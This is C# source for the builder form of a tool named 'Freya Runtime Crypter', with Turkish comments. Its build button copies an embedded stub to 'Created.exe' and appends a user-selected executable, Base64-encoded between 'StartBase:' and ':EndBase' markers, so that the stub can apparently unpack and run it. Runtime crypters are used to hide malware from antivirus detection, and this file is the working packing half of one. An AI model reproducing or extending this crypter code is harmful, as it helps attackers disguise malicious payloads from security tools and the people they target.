using Freya_Runtime_Crypter.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Freya_Runtime_Crypter
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            ofd.ShowDialog();

            textBox1.Text = ofd.FileName;
        }

        private void button2_Click(object sender, EventArgs e)
        {

            File.Create(Application.StartupPath + "/Freya Stub.exe").Dispose();

            File.WriteAllBytes(Application.StartupPath + "/Freya Stub.exe", Resources.Freya_Stub);

            File.Copy(Application.StartupPath + "/Freya Stub.exe", Application.StartupPath + "/Created.exe"); //Burada STUB'un bi' kopyasını oluşturacağız. Application.StartupPath sadece Windows.Forms'larda var , Console kullanıyorsanız Environment.CurrentDirectory+"\STUB.exe" şeklinde yapabilirsiniz.
            FileStream fs = new FileStream(Application.StartupPath + "/Created.exe", FileMode.Append); //FileMode'un Append olmasının sebebi sona yazdıracağız.
            BinaryWriter bw = new BinaryWriter(fs);

            byte[] payload = File.ReadAllBytes(textBox1.Text);

            string textBase = Convert.ToBase64String(payload);


            bw.Write("StartBase:" + textBase + ":EndBase");
            bw.Flush();
            bw.Close();
            fs.Close();

            File.Delete(Application.StartupPath + "/Freya Stub.exe");

            MessageBox.Show("Done!");


        }

        private bool formHareketEdiyor = false;
        private Point fareBaslangicKonumu;

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                formHareketEdiyor = true;
                fareBaslangicKonumu = new Point(e.X, e.Y);
            }
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (formHareketEdiyor)
            {
                Point fareMevcutKonum = PointToScreen(new Point(e.X, e.Y));
                Location = new Point(fareMevcutKonum.X - fareBaslangicKonumu.X, fareMevcutKonum.Y - fareBaslangicKonumu.Y);
            }
        }

        private void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                formHareketEdiyor = false;
            }
        }
    }
}
